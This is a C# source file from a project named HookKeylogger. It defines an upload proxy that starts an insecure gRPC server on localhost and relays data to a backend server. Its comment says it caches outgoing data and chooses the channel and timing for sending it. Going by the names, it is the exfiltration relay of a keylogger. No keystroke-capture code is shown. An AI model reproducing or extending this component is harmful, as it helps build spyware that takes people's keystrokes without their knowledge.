using HookKeylogger.Base;
using System;
using System.Net.Sockets;
using rpc = HookKeylogger.UploadProxy.Rpc;

namespace HookKeylogger.UploadProxy
{
    /// <summary>
    /// This program is a proxy to the actual server, it handles caching the
    /// data to be sent, choosing the best channel to send the data over and
    /// when to send the data.
    /// </summary>
    class Proxy
    {
        static void Main(string[] args)
        {
            int port = 4567;

            Grpc.Core.Server server = new Grpc.Core.Server
            {
                Services = { rpc.UploadProxy.BindService(new rpc.UploadProxyImpl("localhost", 13000)) },
                Ports = { new Grpc.Core.ServerPort("localhost", port, Grpc.Core.ServerCredentials.Insecure) }
            };

            server.Start();
            Console.WriteLine("ServerProxy listening on port " + port);
            Console.WriteLine("Press any key to stop the server...");
            Console.ReadKey();

            server.ShutdownAsync();
        }
    }
}
